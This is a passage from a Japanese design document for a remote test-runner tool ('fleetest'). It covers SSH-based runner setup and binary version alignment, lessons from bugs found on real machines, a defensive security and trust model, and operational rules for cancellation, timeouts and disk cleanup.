                               ログイン・base 配下の導入状況。ready=0 / needs-manual=2 / blocked=1
Scripts/install.sh             **そのまま流用**(外部構成で呼ぶ):
                               `--work-dir <base>/users/<issuer>/work --tool-root <base>/foundation-tester --name <project>`
                               `--skip-extension --skip-mcp --skip-entry-point`
                               `--no-next-steps`(入口ファイルは人が開く機械にだけ要る)
                               `--track-branch`(送るのは手元の install.sh なので、クローンを
                               リリースタグへ移さない。直後の align が手元のコミットへ揃える)
                               **--skip-project は使えない**(WORK_DIR に Package.swift が要る。§12)。
                               --tool-root を明示で渡す(既定の <work-dir>/../foundation-tester は
                               work が2階層深いため RemoteLayout.toolRoot と一致しない。§18.2)
fleetest remote setup <runner>  発行側の入口。local(手元のプロジェクト解決)→ reach → issuer
                               → preflight → install → align → verify の7段。preflight と
                               install.sh は**手元のスクリプトを scp で送って実行する**
                               (リモートに clone が無い初回と、curl 形が main 固定で
                               ブランチ検証に使えない問題の両方を1つの解で塞ぐ)。
                               終了コードは install.sh と同じ 0=完了 / 2=人手の項目が残る / 1=失敗
```

`remote setup` 固有の仕事は **版合わせ(align)・検証ディスパッチ**で、導入本体は
既存 install.sh が持つ。出力規律も install.sh のものをそのまま使う(1ステップ1行+集計、
生ログは `<clone>/.fleetest/install-<日時>.log`)。

**align が要る理由**: 適合チェックは git revision 一致を要求するが、install.sh が clone するのは
upstream の既定ブランチなので、検証中のブランチでは必ず不一致になる。revision は16進7〜40文字を
検証してから埋め、`git fetch` だけを保守開始前に行う。発行側の `ExecutablePath.current` を
ランナーの独立した一時ディレクトリへ scp し、そのコピーの
`api fm-align --target-executable <runner binary> --build-command <checkout と全製品のビルド列>` で
FM の保守とビルドを行う。同じ dispatch.lock の内側で実行し、転送物は成功・失敗とも回収する。
ビルド中も保守の親自身が差し替わらず、古いランナーの CLI が保守機能を持たない場合も停止可否を判定できる。
先行する install 段(install.sh)のビルドも同じ保護を通る —— install.sh は既にビルドがあれば、その複製の
`api fm-align --build-command … --no-restart` でビルドだけを包む(後続の doctor は FM を呼ぶので保護の外。受け手の更新も同じ経路)。
起こし直さないのは保守の親がビルド前の版で、新版を照合で弾くため(FM は次の呼び手が起こす。直後の align が改めて揃える)。
発行側の現在の実行ファイル(約94MB)を各ランナーへSCPし、ランナー上で実行できることが前提。

**ビルドするのは `fleetest` だけではない** —— **配信ヘルパー3本(`fleetest-simstream` /
`fleetest-androidstream` / `fleetest-devicepoll`)もビルドする**。名前の定義元は
`FTCore.StreamHelpers` で、`api device-stream` はこれへ `execv` で化ける。
`--product fleetest` だけにしていた頃は、**そのランナーのタイルは状態は届くのに映像が1枚も
来なかった**(`api device-stream` が exec 対象を見つけられず即死 → 拡張は「映像なし」で諦める)。
2026-08-28 に実際に起きて、**ランナー導入以来ずっと**そうだった(手元は素の `swift build` で
全部ビルドされるので誰も気づかない)。等号は `RemoteSetupTests.testAlignRevisionCommand` が固定する。

**FM 常駐プロセスの版合わせ**:

FM のソケットはユーザーごとに1本なので、別クローンの監視プロセスが起こした常駐も対象になる。
通常の `FMServeHost.decide` は維持し、アライン専用の `FMServeAlignment` で次を行う。

- ビルドの前から新版の身元確認まで、既存のロックファイルを含む全 FM 枠を保守ロックする。
  未起動ならビルドだけを行って成功し、FM は起こさない。
- 稼働中ならビルド前に、独立した退役制御(版1)を送る。
  推論の版を相手の版へ偽装しない。現在の推論通信版は4。
- 常駐側は active・overdue・warming と、登録途中・待機中を含む全 admissions が空であることを
  同じ排他の内側で確認し、新規受付を原子的に閉じて退役する。枠の取得だけで推論終了とは判断しない。
  使用中なら最大25秒待ち、終わらなければ停止せず失敗する。
- 全接続のハンドラと応答書き込みが終わり、ソケットと所有ロックが解放されてから、保守側が
  所有ロックを予約する。解放待ちはbusy待ちの25秒とは別に5秒を確保する。
  予約後に `git checkout → ビルド` を実行する。退役拒否や予約失敗では clone の HEAD も
  既存バイナリも変更しない。ビルド中の予約で、枠を迂回する明示的な死活確認からも再起動させない。
  ビルド成功後、指定されたランナー側のパスを実体へ解決し直して起動する。
  通信版・実体パス・buildStamp の一致まで確認して初めて成功する。
- より新しい通信版の常駐は止めない。安全な退役制御に非対応の通信版2・3には、旧 shutdown も
  強制停止も送らず、一度の手動引継ぎが必要と明示して失敗する。

ビルドを伴わない `api fm-align` 単体では、未起動なら何もせず、通信版・実体パス・起動時の
buildStamp が同じなら再利用する。ビルドを伴う align は同じ版でも先に退役させ、実行中の
バイナリを書き換えない。リンク時の出力置換が原子的であることには依存しない。

古い呼び手そのものは自動更新しない。別クローンを使う VSCode の host-metrics 等も更新・再起動する。
非対応の旧常駐からの移行時は、古い呼び手を止めて FM の利用終了を確認し、人手で旧常駐を終了してから
align を再実行する。利用者向けの対応は [remote-runner-setup.md](remote-runner-setup.md) ステップ3。

**踏んだ罠**: リモートで一時スクリプトを実行して後始末する1行で、終了コードの退避先を
`status` にしていた。**ssh が起こすのは受け手のログインシェル(macOS 既定 zsh)で、zsh の
`status` は `$?` の読み取り専用エイリアス**。代入が失敗して**中のスクリプトの終了コードが
消え**(needs-manual=2 が 1 に化けて blocked と誤報)、後始末も走らず一時ファイルが残った。
localhost へ1回流して初めて出た(単体テストは文字列しか見ない)。

**実機(M1Ultra)の1回目で出た3件**(localhost では1件も出ない):

- **scp して実行する経路にも PATH 補正が要る**。非対話 ssh の PATH は
  `/usr/bin:/bin:/usr/sbin:/sbin` だけなので、install.sh が使う `brew` が見えず
  **入っているのに「Homebrew が無い」で落ちた**。既存の `RemoteShell.remoteRunCommand` には
  同じ手当てがあり §12 にも書いてあったのに、新設した経路へ写していなかった。
  **ssh 越しに何かを起動する経路を足したら、この補正を必ず写す**
- **preflight の自動導入ツール(当時は xcodegen)の判定は brew の有無まで見る必要があった**。「install.sh が入れるから人手扱いに
  しない」は brew がある前提で、両方無いと install.sh が clone 直後に fail した。
  **自動導入に頼る項目は、その導入手段の存在まで判定に含める**(install.sh の条件と一致させる)
- **`set -u` の未代入参照は「その経路を通ったときだけ」落ちる**。ready 行だけが
  `$tool_root_exists` 等を参照しており、手元(needs-manual)では出ず、ランナー機の
  ready で落ちて exit 1 = blocked と誤報した。判定より前に既定値を代入して構造的に防ぐ
  (静的走査は `preflightRunnerMode.test.mjs` が担うが、経路依存の形は見えない)

**環境側で詰まった3件**(ツールの欠陥ではないが、受け手も踏むので手順書に載せた):
古い git プロキシ設定が残っていて GitHub へ出られない / Homebrew が古くて新しい macOS を
知らず brew が1つも動かない(`git -C /opt/homebrew reset --hard origin/master` で復旧)/
**回線が細いと初回の SPM 依存取得が timeout する**(毎回別のリポジトリで落ちるが取得済みは
残るので、4回目で通った。事前に `swift package resolve` を通せば確実)。

**実機での実測(2026-08-16。M1Ultra = M1Ultra・LAN 越し・iOS in-app・1シナリオ)**:
**初回 138.8 秒 / 2回目 12.6 秒**(テスト時間はどちらも約5秒。2回目はブリッジを再利用)。
localhost の実験(初回95秒 / 2回目10.8秒)とほぼ同じ比率で、**コールドは初回だけ**という
Phase 1 ゲートの判断は実機でも成立した。レポート・録画・run ログの回収まで確認済み。

### 単発コマンドの転送は汎用化する(個別実装を作らない)

ssh 越しの操作を用途ごとに実装しない。**2種類だけ**に整理する:

| 種別 | 形 | 例 |
|---|---|---|
| **汎用転送**(状態照会・単発操作) | `fleetest remote exec <runner> -- <サブコマンド>` = リモートで同じコマンドを実行して出力と終了コードを返すだけ | `remote exec studio -- doctor --fm-only`(§14 の FM 検証)/ `-- api device-catalog`・`-- api installed-devices`・`-- api create-device`・`-- api delete-device`(§13 のデバイス選択ダイアログ)/ `-- devices down --device-machine local` |
| **ディスパッチ**(run 系) | `run --runner` / `api run --runner`(実装済み) | 転送(rsync)→ 実行 → 中継 → 回収が付く |

§13 の「取得元セレクタ」「リモートデバイス作成」、§14 の FM 検証は
**すべて汎用転送1つで賄える** — 個別の ssh 実装を書かない
(RemoteExec ヘルパの一段上の一般化)。

**当初案 `fleetest --host <name> <サブコマンド>` から形を変えた(2026-08-16)**:
トップレベルの `--host` はサブコマンド解決と衝突し、`run --runner`(ディスパッチ)と
意味も食い違う。`remote exec <runner> -- <args>` なら**ホスト名より後ろは全部素通し**という
規則1つで済む。転送する引数に `--runner` が含まれていたら拒否する(入れ子のディスパッチを作らない)。

### 利用者から見た手順

1. **ステップ0(ランナー機で1回だけ・物理 or 画面共有)**: まず §5 の**モードを選ぶ** —
   モード A(FileVault 有効・自動ログインなし)かモード B(FileVault 無効+自動ログイン)。
   共通で リモートログイン ON・画面共有 ON・システムスリープ無効・Xcode 導入
   (+必要に応じ Android SDK・AI 有効化)。以後この機械に触るのは、
   **モード A なら再起動のたびの解錠+ログイン1回だけ・モード B なら不要**
2. **ステップ1(発行側から)**: `ssh-copy-id`(初回のみパスワード1回)→ 設定タブで
   ホスト登録 → `fleetest remote setup <runner>`。不足があれば手動手順の番号付きで
   列挙されて止まる(直して同じコマンドを再実行 — 冪等)。全部揃うと
   clone → build(コールド数分は初回のみ)→ toolchain/FM 検証 →
   **利用者の `--profile` でのディスパッチ実走**(verify。`--profile` が無ければ飛ばして warn)まで通って ✅
3. **以後の日常**: 実行先を選ぶ(またはフリート)だけ。シナリオは実行のたびに自動転送。
   ツール本体の版ズレは fail fast で申告され、実行前のダイアログの「更新して実行」で
   `fleetest remote align`(ランナーのクローンを手元と同じコミットへ合わせる)
4. **ランナーを再起動したとき**(OS 更新など): **モード B は何もしなくてよい**
   (自動ログインで Aqua が立つ)。**モード A** は計画再起動なら
   `sudo fdesetup authrestart` → 起動後に画面共有でログイン1回。以後また無人。
   ログイン前にディスパッチすると「loginwindow で待機中 — 解錠が必要」で落ちる(§5)
4. **撤去**: `fleetest remote teardown <runner>`(`<base>` を丸ごと削除。確認付き・
   `--yes` で省略)。手動ステップ0の戻し方は手順書に併記

### Phase 2 との接続

session agent が来たら **`fleetest remote setup` に `--with-agent` を追加**し、LaunchAgent
plist を `~/Library/LaunchAgents` に配置+load する(**ユーザー空間なので sudo 不要** —
決定1の線引きと整合。決定5により専用スクリプトは新設しない)。

**Phase 2 ゲートのモード別の読み**: LaunchAgent は Aqua セッションと共に立つため、
「再起動後に人手なしで受付可能に戻る」は**モード A では「解錠+ログインの後に」**が付く
(モード B はゼロタッチで文字どおり成立)。§10 Phase 2 のゲートはこの読みで判定する。

## 15. セキュリティ前提と信頼モデル(2026-07-31 レビュー)

**実装前に必ず読む。** 以下は「守るべき前提」であって努力目標ではない。

### 15.1 信頼境界の向き — リモートは信頼、リモートの出力は不信

- **信頼するもの**: ランナー機そのもの(自分/自組織のフリート。ssh 鍵で入れる = そのユーザー
  として任意コード実行できる関係。これは設計上そう決めている)
- **信頼しないもの**: **リモートが生成して返してくる中身**。NDJSON・JUnit XML・レポート・
  スクリーンショット・録画・ファイルパスはすべて**外部入力として扱う**。具体的な規律:
  - 回収したレポート(HTML 等)を **webview で無検証に開かない**(§11 の「クリック時に
    回収して開く」の実装地点。外部ブラウザで開く / サニタイズする / テキストとして出す)
  - 回収パスは**書き込み前に検証**(展開先が想定ディレクトリ配下に解決されること)。
    回収の rsync には **`--safe-links`**(宛先の外を指すシンボリックリンクを受けない)を付ける
    —— §15.3 の既定では `results/` は同僚全員が書けるので、入力は「信頼するランナー」ではなく
    共有ディレクトリとして扱う。**送信側(手元 → リモート)には付けない**(受け手の
    `TestProjects/` 内の正当なリンクを落とすため)
  - 中継 NDJSON は既存の型検証を通してから描画する(不正行は捨てる)
- **§7 の適合チェックは認証ではない**。rev・ToolchainFingerprint は
  **リモートが生成した文字列**であり、敵対的ホストは任意に詐称できる。あれは**版スキュー
  検出**であって信頼境界ではない。「適合チェックを通ったから中身を信用してよい」と
  読まないこと
- **唯一の実効的な相手認証は SSH のホスト鍵検証**。だから §3 の禁止事項(
  `StrictHostKeyChecking` を無効化しない)は設計上の必須要件

### 15.2 ディスパッチ先の決定経路(設定の乗っ取り防止)

- **登録簿は LocalConfig に置く**(§13)。VSCode 設定は既定 window スコープで、
  リポジトリの `.vscode/settings.json` から上書きできるため、悪意あるリポジトリを開いて
  普通にテストを実行しただけで**ディスパッチ先を差し替えられる**
- **現行の対処**: 登録簿が LocalConfig へ移り、`fleetest.remote.hosts` / `fleetest.remote.target`
  の VSCode 設定は拡張に存在しない(`package.json` に無い)ので、ワークスペース設定から
  ディスパッチ先を差し替える経路そのものが無い
- 現状これが実害に至っていないのは、未知ホストへの ssh がホスト鍵検証で接続段階に
  失敗し、**rsync 転送(= プロジェクトファイルの送信)に到達しない**ため。
  裏を返せば、**ホスト鍵検証を緩めた瞬間にこれは実害化する**(15.1 の禁止事項と同根)

#### 15.2.1 `fleetest.binaryPath` だけは window スコープのまま(境界は Workspace Trust)

同じ「ワークスペース設定からの乗っ取り」の形が **実行ファイルのパス**にもある ——
開いたフォルダの `.vscode/settings.json` が `fleetest.binaryPath` を任意の実行ファイルへ
向けられ、activate 直後の `checkFleetestCompat`(`src/extension.ts`)がそれを spawn する。
既定値 `.build/debug/fleetest` もワークスペース相対なので、**設定を書き換えなくても**
その名前のファイルを置いたリポジトリを開けば動く。

**それでも `"scope": "machine"` にはできない**: 受け手のセットアップ(`ProjectScaffold` /
`InitCommand`)がこの値を `.vscode/settings.json` へ書くので、machine にすると
セットアップ直後の拡張が CLI を見つけられない。

よって境界は **VSCode の Workspace Trust 1本**に置く。`package.json` の
`capabilities.untrustedWorkspaces.supported = false` を**明示的に宣言する**(宣言が無くても
既定で制限モードでは無効化されるが、暗黙に頼ると気づかず外れる)。
`vscode-fleetest/test/workspaceTrust.test.mjs` が宣言の消失と、
「binaryPath を machine にして直す」誤った修正の両方を落とす。

### 15.3 共有ラボの identity(用途②を採るときの明示的選択)

§1 の用途②(デバイス/実機ラボの共有)は、**認証・帰属・失効の設計を伴わない限り
「同一信頼グループ内での共有」に限る**。全員が同じ UNIX ユーザーの `authorized_keys` に
鍵を足す構成では:

- 実行の帰属が取れない(§11 の「誰の run か」表示は実装できない)
- 鍵の失効手順が無い(退職・端末紛失時に個別取り消しができない)
- 各人のプロジェクトファイルが同一マシン上で相互に読める

**採るべき立場を先に決める**: (a) 同一信頼グループ限定と割り切り、§11 の占有表示は
「どの run が使用中か」だけにする(「誰の」は出さない)/ (b) ユーザーごとの macOS
アカウントを立てる(デバイス競合と運用コストが増える)。(a) が既定。

### 15.4 ランナー機に載る資産

- ランナーには SSH 鍵・ソース・シナリオ・プロファイル・レポート・録画が載る。
  **モード A(FileVault 有効)が既定**(§5・§14)。**モード B(FileVault 無効+自動ログイン)を
  選ぶ場合の受容リスクを明記して選ぶこと**:
  - Apple silicon ではディスク自体は常時暗号化されているが、**起動できる人はデータに
    到達できる**(鍵が起動時に自動で使える)。したがって**物理的に施錠された設置**が条件
  - 自動ログインは**ログインパスワードを `/etc/kcpassword` に可逆な形で保存する**。
    そのアカウントのパスワードを他所で使い回さない(ランナー専用にする)
  - 発行側から入ってくる SSH 公開鍵に対応する秘密鍵は**発行側**にあるが、ランナー上の
    鍵(ランナーが他所へ入るための鍵)は置かないのが望ましい
- **シナリオ・プロファイルに本番資格情報を置かない**。テスト資格情報も
  スクリーンショット・録画に写り込む(ログイン画面の入力等)。共有ラボでは他人が
  読める場所に残るため、**録画はランナー上に残さず回収後に削除する**
  (**回収に成功したときだけ** `RemoteArtifactCollection.deleteRecordingsCommand` で消す ——
  回収できていない物を消すと唯一の証拠を失う)
- 転送物は最小に保つ(アプリバイナリを送らない既定を維持。§12)

### 15.5 破壊的操作

- リモートへの `devices down` / デバイス削除・作成は**他人の実行を壊し得る** →
  ホスト側 `showWarningMessage({modal:true})` で確認(§11・§13)。
  **確認には保持者を添える**(§18.7。占有が不明なら何も足さない)
- 転送の `--delete` は宛先を上書きする → `--remote-dir` は登録簿の値のみ(§3 禁止事項)

### 15.6 ネットワーク露出 — inbound は sshd だけ

**このツールは公開インターフェースに1つも listen しない。** 発行側もランナー機も、
外から繋がれる口は **sshd 1つだけ**で、転送(rsync)・進行表示・成果物回収・ライブ映像は
すべてその ssh 接続の中を通る(映像は `api device-stream` が向こうで配信ヘルパーへ `execv`
して stdout に流す。§13)。実際に listen するのは全部ループバック:

| listen するもの | アドレス |
|---|---|
| in-app ブリッジ(シミュレータはホストとネットワークスタックを共有) | `127.0.0.1:<port>` |
| adb server | `127.0.0.1:5037` |
| エミュレータの gRPC | `[::1]` |

**この不変条件を崩さない。** ブリッジやヘルパーを外部アドレスへ bind する変更は、
**認証の無い口をネットワークに開ける**ことと同義になる(ブリッジは任意のアプリ操作を
受け付ける)。遠隔のブリッジが要るという話になったら §2 の案 A(却下済み)を読み直す。

運用側の帰結は3つ:

1. **ルーター越し・別ネットワークのランナーは設計上そのまま成立する**(ssh が通ればよい)。
   ポート・踏み台は `~/.ssh/config` に畳む —— `RemoteHostSpec.parse` は `:`・空白・`-` 始まりを
   拒否し、ディスパッチは `ssh` に `-p`/`-J` を付けない
2. **22 を素のインターネットへ晒す形は §15.3 の「同一信頼グループ」前提から外れる**。
   VPN 越しにするのが既定の想定
3. macOS の**「すべての着信接続をブロック」は sshd ごと落とす**(ループバックはこの
   ファイアウォールの対象外なので、ブリッジ類は影響を受けない)

## 16. 運用上の考慮と拡張(2026-07-31 運用レビュー)

「日々回し続ける・障害が起きる・誰も見ていない機械がある」観点での設計。

### 16.1 中断とキャンセルの伝播(実装済み: `-tt` + InterruptRelay。2026-08-18 に実測で補強)

**ssh クライアントを殺してもリモートの `fleetest run` は死なない**(TTY 無しで起動しており
SIGHUP が伝播しない)。拡張の run キャンセル・Ctrl-C・ローカル側の異常終了で、
**リモートにシミュレータを掴んだままの孤児 run が残り、次のディスパッチがデバイス競合で
失敗する**。

ssh を `-tt`(擬似 TTY 強制割り当て)で起動し、切断時に SIGHUP がリモートのプロセスグループへ
伝わるようにする。副作用として ssh が stdin を TTY 化するため、**stdin は `/dev/null` に固定**
する(ディスパッチは対話しない。`--debug` 等の stdin 制御はそもそも `--runner` と併用不可)。

**`-tt` だけでは足りない**(2026-08-18 に実測): **親を殺しても子は死なない** —— Foundation の
`Process` は親の終了に子を巻き込まないので、fleetest を kill しても **ssh クライアントが生き残り**、
切断が起きないので SIGHUP も発火しない。実際にリモートへ走りっぱなしの run が残り、
`dispatch.lock` も握られたままになった(残った子は exit 途中で刺さり、次のディスパッチが
数十分ぶん詰まった)。`Sources/fleetest/InterruptRelay.swift` が SIGINT/SIGTERM/SIGHUP を
横取りして子へ流す。守る規律2つ:

- **中断を握りつぶさない代わりに、子を落としてから通常の巻き戻しを続ける** ——
  こうしないと `defer`(dispatch.lock の解放・終了スクリプト)が動かない
- **エスカレート(SIGKILL)は ssh にだけ掛ける**(2秒)。**fleetest の子には掛けない** ——
  子は SIGTERM のあとにロック解放と終了スクリプトを走らせるので、時間で殺すとそれを飛ばす
  (2秒で殺していた版では実際にロックが残った。子の exit=9 が witness)。片付けの所要は
  利用者のスクリプト次第で上限を決められないので待つ側に倒す(刺さったら人が kill -9 する)

- **シグナルソースは1プロセスに1組**(2026-08-24)。ホスト別の子を並行に持つ親
  (DeviceMachineRunner / FleetRunner)は relay を同時に複数抱える。relay ごとにソースを立てて
  `stop()` が `SIG_DFL` を戻す作りだと、**先に終わった子の stop() が残りの子の横取りまで解く** ——
  手元のぶんが先に終わった分散 run の親へ `kill -INT` すると、親だけ既定動作で死に、
  M1Max の子・ssh・リモートの run・dispatch.lock が全部残った(受け手報告 2026-08-23)。
  端末の Ctrl-C はプロセスグループ全体に届くので子も自力で止まり、差として現れない
  (「Ctrl-C では止まるのに kill -INT では残る」はこの形)。今は登録 0→1 で立て 1→0 で戻す
  (`InterruptRelayTests` が自プロセスへ SIGINT を撃って固定する)

- **`kill -9` 等で親が後始末無しに死んでも ssh を残さない**(`FTRemote.ParentBoundCommand`)。
  InterruptRelay はシグナルを受けられないと働かないので、`-tt` の ssh を `/bin/sh` の包みに入れ、
  包みの見張りが 2 秒ごとに「自分の親が起動時の pid のままか」を見て、変わっていたら ssh へ SIGTERM を送る
  (親が死ぬと包みは launchd へ付け替わる)。**孤児の ssh は害が大きい**: 出力の渡し先を失って channel を
  読まなくなるので、リモートの run は出力の write で止まったまま終わらない(実測: 11 分止まり、ssh を止めた
  瞬間に完走した)—— dispatch.lock もデバイスも握り続け、上の自動回収も「run が生きている」ので効かない。
  包みの後はリモートの run が SIGHUP で中断の経路を通って終わり(`interrupted: true`)、次のディスパッチが
  ロックを自動回収する(2026-09-11 に M1Max で確認)

- **中断したら、回収へ入る前にロックを外す**(2026-09-16)。回収(とくに録画の rsync)は数十秒かかり、
  その間に中断の猶予が尽きて SIGKILL されると `defer` に届かずロックが残る(3 機とも
  `collecting recordings` の最中に刺されて残った)。外すのは**このディスパッチの run がランナーに居ない**と
  1 往復で確かめられたときだけ(`RemoteDispatchLock.releaseIfRunEndedCommand`)—— ssh は中断で先に
  切れうるので、向こうの run がまだ後始末中なら外さず、従来どおり末尾の `defer` に任せる。
  出るのは `==> released the dispatch lock before collecting (the run was interrupted)`

取りこぼした孤児は 16.4 の `remote clean`(+ 終了スクリプトは `hooks reap`)で掃除する。
**自分の死んだディスパッチが残したロックだけ**は `fleetest remote unlock --runner <h>` で外す
(下記「二重ディスパッチのロック」)。

### 16.2 ディスパッチ全体のタイムアウト(**実装済み: `--remote-timeout`**)

`ConnectTimeout=10` は**接続だけ**の上限。リモートが loginwindow で待機中・シミュレータが
固着した場合、run が終わるまでローカルは**無限に待つ**(夜間バッチは翌朝まで詰まる)。
**ジョブ全体の上限を設ける**(`--remote-timeout <秒>`。既定は run プロファイルの
`scenarioTimeout × シナリオ数` から算出した安全側の値)。超過時は 16.1 の経路で
リモートを止め、インフラ起因の失敗として報告する。

**実装(`FTRemote.RemoteTimeout.seconds`。`run` / `api run` の両方に `--remote-timeout`)**:
優先は **明示 > 自動算出 > 無期限**。自動算出は `overhead 900s + 600s × シナリオ数` を
1800..86400 にクランプする。**シナリオ数が分からないとき(プロファイル全体・`--fleet`)は
安全弁を掛けない**(nil)—— 以前は 0 本を「極小値」と読んで下限 1800 秒へ丸め、**30 分を超える
正当な run を SIGKILL していた**(欠陥2・2026-08-17)。タイムアウトは無限に待たないための
安全弁であって、正当な実行を打ち切る装置ではない。無期限で待つときは黙らず 1 行知らせる
(`RemoteRunDispatcher.announceTimeout`)。

### 16.3 ログイン状態の事前判定(**実装済み**)

§5 で定めた `stat -f%Su /dev/console` によるチェックを**適合チェックの隣で実行する**。
未実装のままだと「シミュレータ起動の不可解な失敗」として現れ、切り分けに時間を溶かす
(§5 自身が警告している状況)。不一致なら
**「ランナーが loginwindow で待機中 — 解錠が必要」で fail fast**。

**実装は設計から1段強くなっている** —— `/dev/console` だけでは**画面共有(仮想ディスプレイ)で
ログインした機械を落としてしまう**ので、まず `launchctl print gui/$(id -u)` の成否で GUI
セッションの実在を見て、無ければ `/dev/console` へ落ちる(`FTRemote` の
`RemoteDispatch` 内。負の対照として loginwindow 停止中は gui/0・gui/999 とも失敗する)。
取得は `resolveLayout` の $HOME 取得と**同じ ssh 往復に相乗り**する(ssh を足さない)。
`remote status` の **LOGIN 欄**が同じ値を出す。

### 16.4 誰も見ていない機械のディスク(**実装済み** = `remote clean`)

`<base>/users/<issuer>/work` の results DB・reports・録画は**溜まり続ける**。ローカルなら人が気付くが
**ランナーは誰も見ない** — 数か月でディスクフルになり、ある日フリート全体が落ちる。
`fleetest remote clean --runner <名前>` で ①孤児プロセス・ゾンビブリッジの掃除(`devices down` 相当)
②保持ポリシーを超えた results/reports/録画の削除、を行う。空き容量は 16.5 の status に出す。
**走っている run があるときは中止する**(§18.7。`--ignore-lock` で押し切れる)。
**発行者別の使用量も出す**(`du -sk users/*/work`。ディスクはホスト共有資源なので
「誰のぶんが食っているか」が見えないと消す判断ができない。du は遅いので status には置かない)。

### 16.5 フリートの一括診断(**実装済み** = `remote status`)

ホストが3台を超えると「どれが今使えるか」の確認が運用の主コストになる。
`fleetest remote status --runner <host>...` で**全ホストへ並列に**到達性・rev・toolchain・
FM 可否・**ログイン状態**(16.3)・空き容量・**占有**(LOCK。§18.7)を投げ、1画面の表にする。
**1ホスト = 1往復に収める**(項目を足すときはプローブのブロックを増やす。ssh を足さない)。
拡張は `remote status` を起こさず、版ズレは `api remote-compat` で見る(§7)。

**FM 欄は死活台帳から埋める(FM 呼び出しゼロ)**。ランナーの `~/.fleetest/fm-liveness.json`
(`FTCore.FMLiveness`)を同じ1往復で読むだけ —— **status から FM を実呼び出ししない**
(ホスト数ぶん直列化の枠を奪い、しかも測る対象を自分で消費する)。表記と規律:

| 表記 | 意味 |
|---|---|
| `ok` | **両経路とも 生 と確かめられた**とき。片方が不明のまま ok とは言わない(観測できていない経路が死んでいる可能性を隠す) |
| `ng:vision` / `ng:text+vision` | 死んだ経路を名指しする。text と vision で無効になる機能が違うので、`ng` だけではそのランナーに何を投げてよいか決まらない |
| `-` | 不明(台帳が無い・旧ランナー・`FMLiveness.freshSeconds` より古い) |

**鮮度は手元の時計で当てる**。`checkedAt` は向こうの時計なので、時刻がずれた機械では新しい
記録も古く見えうるが、**その場合は `-` に落ちるだけで生死を誤って断定する方向へは倒れない**。
台帳を新しく保っているのはモニターの fan-out(`api host-metrics --fm-probe` が機械ごとに
60 秒間隔で取り直す)なので、監視を開いていればたいてい埋まる。
**`--fm` は残す** —— こちらは実呼び出しで「今この瞬間」を確かめる別口で、付いていれば台帳より優先する。

### 16.6 ツールチェーン更新の運用手順

**止まるのは、発行側の製品版に一致する Xcode がランナーに1つも無いときだけ**(§7)。同じ
製品版のベータ間(build 番号だけの違い)は advisory になり、ディスパッチは止まらない。
**製品版をまたぐ更新は「新しい Xcode を `/Applications` に並べて入れる」だけで済む** ——
旧 Xcode を消さなければディスパッチは発行側に合う方を自動で選ぶので、両機を同時に上げる
必要が無い。**旧 Xcode を消して置き換える運用にする場合だけ**、フリートでは**カナリア更新**
(1台だけ更新 → 検証ディスパッチ1本 → 通ってから残りへ展開)を手順とする(置き換えの間、
その製品版に一致する Xcode が無い機械へのディスパッチは止まる)。別の場所に置いた Xcode・
同じ製品版の複数ビルドを使い分けたい場合は登録簿の `developerDir` pin で固定する。将来
`remote update --canary` として自動化する価値がある(Phase 3 以降)。

### 16.7 その他の運用契約

- **プロジェクトはリモート上で共存する**(転送は `TestProjects/<project>/` 単位で、
  `--delete` の影響も同じプロジェクト配下に閉じる)。複数プロジェクトを交互に
  ディスパッチしても互いを消さない
- **インフラ起因の失敗はシナリオの失敗と区別する**(到達不能・loginwindow・タイムアウト)。
  将来の別ホストへの振り替え(Phase 3)は**インフラ起因に限定**する —
  シナリオ失敗の自動リトライは flake を隠すため入れない(既存方針)
- `--runner` + ドライラン(転送内容と実行コマンドだけ表示)は切り分けに有用。
  **現状の `--dry-run` は併用してもエラーにはならないが、ディスパッチ自体を行わない**
  (`RemoteDispatch.dispatchesRemotely` = `host != nil && !dryRun` —— 手元でステップを
  列挙するだけ)。転送内容のプレビューは**まだ無い**ので、欲しければ別フラグとして足す

### 実装順序

| 段 | 内容 | 位置づけ |
|---|---|---|
| 1 | 16.1 キャンセル伝播・16.2 全体タイムアウト・16.3 ログイン検出 | **実装済み**(ディスパッチの正しさ。実運用前に必須) |
| 2 | 16.5 `remote status` | **実装済み**(フリート運用の要) |
| 3 | 16.4 `remote clean` | **実装済み**(放置するとディスクフル) |
| 4 | 16.6 カナリア更新の自動化・振り替え・ドライラン | **未実装**。複数台の定常運用に入ってから |

## 17. リモート制御(ワークスペース + 開始/終了スクリプト。実装済み: 2026-08-17。
ステージング方式へ改定: 2026-08-17。既定を常時有効化・プロジェクト配下は専用ミラー不要へ改定:
2026-08-18。**旧称「ファイル同期」/ 旧キー `fileSync` を `remoteControl` へ改名し、
run 前後のスクリプトを追加: 2026-08-18**)

§13「アプリプロファイル」で保留していた実害の解決: リモートへディスパッチすると、
appPath の絶対パス(リポジトリルート基準)がランナー機に存在せず
`package file not found` で必ずインストールに失敗していた
(§13 が転送するのは `TestProjects/<project>/` だけで、アプリのパッケージ自体は運ばない)。

**設計は「原本 → ステージング(apps/) → (必要なら)ミラー → リモートのインストール」の一本道**。
appPath の相対パスは**常にリポジトリルート基準で解決する**(= アプリの原本の場所。ワークスペースの
既定/明示のどちらでも基準を変えない)。**ワークスペースは常に有効**(§既定と配置)—— 実行時に
appPath の原本をワークスペースの `apps/<名前空間>/<原本のファイル名>` へコピー(ステージング)し、
**インストールに使うパスだけ**をそちらへ切り替える。手元でもリモートでも同じ規則(「無ければ原本を
見る」のような存在チェックによる分岐は無い)。以前の版は宣言時に appPath の相対パス解決の基準
そのものをワークスペースへ切り替えていたが、原本の置き場所とインストールに使う場所を混同していた
(利用者はプロファイルの `appPath` をワークスペース配下の構造に合わせて書き直す必要があった)。

**名前空間(`<名前空間>`)はプロファイル JSON に書かれた宣言文字列(declared。resolvePath で
絶対化する前)から SHA-256 の先頭12桁で決定的に導く**(`WorkspaceAppStaging.installPath`)。
基準を basename だけにすると、同じプロジェクトの別アプリプロファイルが同名の別ビルドを指す
場合(例: `dist/ios-simulator/X.app` と `dist/ios-device/X.app` を別々のアプリプロファイルで
appPath に書く)、並走する2つの run が同じ `apps/X.app` を交互に上書きし合う
(実測: 実機の run がシミュレータ build を install して 0xe8008014 で落ちた)。名前空間の元に
**絶対パス(source/sourcePath)を使わない** —— repoRoot がローカルとリモートの子で異なるため、
同じ宣言でもホストごとに違う名前空間になり、リモートの子が自分で resolve() し直したときに
手元がステージしたファイルを見失う。declared はプロジェクトの JSON ファイル自体を通じて
両ホストへ同じ文字列で届くので、ここから導けば常に一致する。

### 既定と配置

- **既定のワークスペースは `<project.rootURL>/workspace`**(`remoteControl.workspace` 省略時。
